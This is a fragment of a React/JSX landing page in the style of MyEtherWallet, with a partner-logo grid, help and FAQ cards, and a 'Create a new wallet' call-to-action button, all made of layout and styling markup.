            <div className="grid grid-cols-2 md:grid-cols-5 gap-8 items-center justify-items-center">
              <img
                src="https://www.myetherwallet.com/mew-landing-page/_ipx/s_288x168/images/partners/ledger.svg"
                alt="Ledger"
                className="h-8 transition"
              />
              <img
                src="https://www.myetherwallet.com/mew-landing-page/_ipx/s_288x168/images/partners/coinbase.svg"
                alt="Coinbase"
                className="h-8 transition"
              />
              <img
                src="https://www.myetherwallet.com/mew-landing-page/_ipx/s_288x168/images/partners/web3foundation.svg"
                alt="Web3 Foundation"
                className="h-8 transition"
              />
              <img
                src="https://www.myetherwallet.com/mew-landing-page/_ipx/s_288x168/images/partners/trezor.svg"
                alt="Trezor"
                className="h-8 transition"
              />
              <img
                src="https://www.myetherwallet.com/mew-landing-page/_ipx/s_288x168/images/partners/moonpay.svg"
                alt="MoonPay"
                className="h-8 transition"
              />
            </div>

            <div className="grid grid-cols-2 md:grid-cols-5 gap-8 items-center justify-items-center mt-8">
              <img
                src="https://www.myetherwallet.com/mew-landing-page/_ipx/s_288x168/images/partners/topper.svg"
                alt="Topper"
                className="h-8 transition"
              />
              <img
                src="https://www.myetherwallet.com/mew-landing-page/_ipx/s_288x168/images/partners/changelly.svg"
                alt="Changelly"
                className="h-8 transition"
              />
              <img
                src="https://www.myetherwallet.com/mew-landing-page/_ipx/s_288x168/images/partners/simplex.svg"
                alt="Simplex"
                className="h-8 transition"
              />
              <img
                src="https://www.myetherwallet.com/mew-landing-page/_ipx/s_288x168/images/partners/1inch.svg"
                alt="1inch Network"
                className="h-8 transition"
              />
              <img
                src="https://www.myetherwallet.com/mew-landing-page/_ipx/s_288x188/images/partners/rivet1.svg"
                alt="Rivet"
                className="h-8 transition"
              />
            </div>
          </div>
        </div>
      </section>

      {/* Arm yourself with knowledge Section */}
      <section className="py-20 px-6 bg-white">
        <div className="max-w-7xl mx-auto">
          <h2 className="text-4xl md:text-6xl lg:text-7xl font-bold text-gray-900 mb-16">
            Arm yourself with
            <br />
            knowledge.
          </h2>

          <div className="grid md:grid-cols-2 lg:grid-cols-4 gap-6">
            {/* New to crypto */}
            <div className="bg-white rounded-3xl p-8 shadow-sm border border-gray-200 relative overflow-hidden">
              <h3 className="text-3xl font-bold text-gray-900 mb-4">
                New to crypto? Explore MEWtopia!
              </h3>
              <p className="text-gray-600 text-lg mb-8">
                Learn how to get the most out of Ethereum with our free library
                of resources!
              </p>
              {/* Decorative dots - blue */}
              <div className="absolute bottom-0 left-0 right-0 h-16">
                <img
                  src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRL33Hyg8IOYWYIvA6OxGzI5WPPIlbxi70Anw&s"
                  alt=""
                  className="w-full h-full object-cover"
                />
              </div>
            </div>

            {/* Help Center */}
            <div className="bg-gray-100 rounded-3xl p-8 shadow-sm relative overflow-hidden">
              <h3 className="text-3xl font-bold text-gray-900 mb-4">
                Help Center
              </h3>
              <p className="text-gray-600 text-lg mb-8">
                How to use MEW products and stay safe in web3.
              </p>
              {/* Decorative dots - purple */}
              <div className="absolute bottom-0 left-0 right-0 h-16">
                <img
                  src="https://static.vecteezy.com/system/resources/thumbnails/067/969/489/small/vibrant-abstract-gradient-dot-pattern-in-green-orange-and-blue-vector.jpg"
                  alt=""
                  className="w-full h-full object-cover"
                />
              </div>
            </div>

            {/* FAQ */}
            <div className="bg-white rounded-3xl p-8 shadow-sm border border-gray-200 relative overflow-hidden">
              <h3 className="text-3xl font-bold text-gray-900 mb-4">
                Frequently Asked Questions
              </h3>
              <p className="text-gray-600 text-lg mb-8">
                Most common questions about crypto
              </p>
              {/* Decorative dots - teal */}
              <div className="absolute bottom-0 left-0 right-0 h-16">
                <img
                  src="https://media.istockphoto.com/id/855295276/photo/halftone-effect-background.jpg?s=612x612&w=0&k=20&c=BFZTvSp3HP2TUFzBOs5Lenra3Jcc1p50rJRiBAiEnko="
                  alt=""
                  className="w-full h-full object-cover"
                />
              </div>
            </div>

            {/* Chat with support */}
            <div className="bg-white rounded-3xl p-8 shadow-sm border border-gray-200 relative overflow-hidden">
              <h3 className="text-3xl font-bold text-gray-900 mb-4">
                Chat with support
              </h3>
              <p className="text-gray-600 text-lg mb-8">
                Get help from actual humans.
              </p>
              {/* Decorative dots - blue */}
              <div className="absolute bottom-0 left-0 right-0 h-16">
                <img
                  src="https://static.vecteezy.com/system/resources/thumbnails/036/032/867/small/abstract-background-with-dots-wavy-pattern-on-blue-color-gradient-vector.jpg"
                  alt=""
                  className="w-full h-full object-cover"
                />
              </div>
            </div>
          </div>
        </div>
      </section>
      <section className="py-32 px-6 bg-gray-50">
        <div className="max-w-4xl mx-auto text-center">
          {/* Heading with inline astronaut */}
          <h2 className="text-5xl md:text-6xl lg:text-7xl font-bold text-gray-900 mb-8 inline-flex flex-col items-center">
            <span className="relative inline-block">
              {/* Astronaut Image - Hugging the G */}
              <img
                src="https://www.myetherwallet.com/mew-landing-page/_ipx/s_96x96/images/misc/peggy-love.svg"
                alt="Peggy"
                className="absolute -top-10 -left-8 md:-left-10 w-16 h-16 md:w-20 md:h-20 lg:w-24 lg:h-24"
              />
              Grab control
            </span>
            <span>of your future</span>
          </h2>

          {/* CTA Button */}
          <div className="mt-8">
            <button className="bg-blue-600 hover:bg-blue-700 text-white font-bold text-lg px-10 py-5 rounded-full transition shadow-lg">
              Create a new wallet
            </button>
          </div>
        </div>
      </section>
      {/* Newsletter Section */}
      <NewsletterSection />
    </main>
  );
}
